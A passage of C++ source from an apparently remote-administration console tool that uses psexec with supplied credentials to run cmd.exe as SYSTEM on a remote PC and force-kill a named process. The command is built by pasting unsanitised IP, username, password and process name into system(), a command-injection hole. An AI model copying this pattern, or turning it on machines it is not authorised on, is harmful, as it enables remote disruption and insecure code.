	std::cout << ProcessToClose << '\n';
	color('Y');
	std::cout << "         =                                                                                    \n";
	std::cout << "         -------------------------------------------------------------------------------------\n";
	color('C');
	std::cout << "[+] Authenticating...\n";
	color('C');
	//system(("psexec -s -d \\\\" + pc.ip + " -u " + pc.username + " -p " + pc.password + " cmd.exe /c taskkill /F /IM " + ProcessToClose + " /T -accepteula").c_str());
	system(("psexec -s \\\\" + pc.ip + " -u " + pc.username + " -p " + pc.password + " cmd.exe /c taskkill /F /IM " + ProcessToClose).c_str());
	color('Y');
	std::cout << "DONE\n";
	pause('y');
	std::cin.ignore();
	chooseoption();
	return;
}
